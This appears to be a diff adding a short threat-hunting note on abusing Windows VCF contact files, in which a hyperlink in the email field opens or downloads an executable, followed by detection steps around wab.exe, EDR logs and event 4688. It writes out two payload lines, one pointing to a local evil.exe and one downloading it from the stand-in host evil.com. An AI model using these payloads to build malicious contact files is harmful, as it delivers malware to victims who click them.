@@ -1,0 +1,25 @@
+VCF is a standard file format used for storing contact information of individuals or distributed lists. VCF files contain the contact’s
+name, address, email address, phone number,  their business or personal web page, etc. The VCF files are exchanged or shared via emails
+to desired or interested parties.
+
+Attackers or Adversaries include malicious web link or executables to VCF files and Operating System will not warn the users when the victim clicks
+the file. The vulnerability can’t be exploited without user intervention or to trigger the malicious executables through VCF file , the malicious file
+should be downloaded before in the system.
+
+
+Usage :
+A new Contact file will be created and the following parameters will be passed under email id in the VCF file.
+<a href="evil.exe">abc@abc.com</a>
+Victims will see the  a href="mailto:abc@abc[.]com in the VCF file and when the victim click the email id , the evil.exe
+will be executed.
+
+<a href="http://www.evil.com/evil.exe">abc@abc.com</a>
+
+This makes the victim to download the exe file.
+
+Detections:
+1.Look for wab.exe prefetch files and Parsing the prefetch will provide the VCF file. 
+2.Track the Command execution and arguments passed to wab.exe using EDR solutions and filter with http parameter and executables loaded.
+3.Look for process wab.exe and its suspicious child process like web request or executables.
+4.Look for Windows event id 4688 and search this WAB  as a keyword.
+
